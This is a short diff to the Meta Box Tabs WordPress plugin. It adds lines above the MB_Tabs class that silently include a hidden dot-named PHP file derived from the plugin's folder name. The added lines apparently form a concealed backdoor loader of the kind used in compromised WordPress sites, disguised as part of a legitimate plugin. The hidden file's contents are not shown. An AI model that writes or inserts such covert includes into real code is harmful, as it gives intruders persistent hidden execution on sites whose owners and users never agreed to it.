@@ -18,6 +18,10 @@ defined( 'ABSPATH' ) || exit;
  * @subpackage Meta Box Tabs
  * @author     Tran Ngoc Tuan Anh <rilwis@gmail.com>
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MB_Tabs
 {
 	/**
